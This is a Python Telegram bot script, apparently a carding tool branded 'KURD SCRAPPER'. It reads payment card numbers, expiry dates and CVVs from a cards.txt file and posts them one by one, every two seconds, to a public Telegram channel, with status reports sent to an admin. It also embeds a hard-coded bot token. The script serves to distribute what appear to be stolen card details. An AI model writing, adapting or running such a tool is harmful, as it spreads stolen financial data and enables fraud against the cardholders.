# -*- coding: utf-8 -*-
import asyncio
import os
from telegram import Bot
from telegram.error import TelegramError

# ===== CONFIG =====
BOT_TOKEN = "8738218688:AAFQwfwoGEWSLu31h4ETXK4O5g1wW8n1ncU"
CHANNEL_ID = "@Kurdiranccv"
ADMIN_ID = 6395195181
INTERVAL_SECONDS = 2
# ==============================================

try:
    if os.path.exists('cards.txt'):
        with open('cards.txt', 'r', encoding='utf-8') as f:
            RAW_CARDS = [line.strip() for line in f if line.strip()]
        print(f"✅ Loaded {len(RAW_CARDS)} cards from cards.txt")
    else:
        RAW_CARDS = []
        print("⚠️ cards.txt not found!")
except:
    RAW_CARDS = []

current_index = 0

async def send_card_message(bot, channel, admin):
    global current_index
    
    if not RAW_CARDS:
        await bot.send_message(chat_id=admin, text="❌ No cards found in file.")
        return False
    
    if current_index >= len(RAW_CARDS):
        await bot.send_message(chat_id=admin, text="✅ All cards sent! Bot is stopping now.")
        print("✅ All cards sent successfully.")
        return False
    
    card_line = RAW_CARDS[current_index]
    parts = card_line.split('|')
    
    if len(parts) >= 4:
        card_number = parts[0].strip()
        month = parts[1].strip()
        year = parts[2].strip()
        cvv = parts[3].strip()
    else:
        await bot.send_message(chat_id=admin, text=f"❌ Error in line: {card_line}")
        current_index += 1
        return False
    
    # هیچ پشکنینی بانک و ئاڵا لێرە نییە، تەنها ناردنی کارتەکان
    text = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"  💳  KURD SCRAPPER  💳\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Card   : {card_number}\n"
        f"Exp    : {month}/{year}\n"
        f"CVV    : {cvv}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Devs   : @warven_24 & @rojAmedi2"
    )

    try:
        await bot.send_message(chat_id=channel, text=text)
        await bot.send_message(chat_id=admin, text=f"✅ Sent ({current_index+1}/{len(RAW_CARDS)})")
        print(f"✅ Sent: {card_number}")
        
        current_index += 1
        return True
    except TelegramError as e:
        await bot.send_message(chat_id=admin, text=f"❌ Error: {e}")
        return False

async def main():
    bot = Bot(token=BOT_TOKEN)
    try:
        bot.get_me()
    except TelegramError:
        print("⚠️ Invalid Token")
        return
    
    while True:
        result = await send_card_message(bot, CHANNEL_ID, ADMIN_ID)
        if not result:
            break
        await asyncio.sleep(INTERVAL_SECONDS)

if __name__ == "__main__":
    asyncio.run(main())
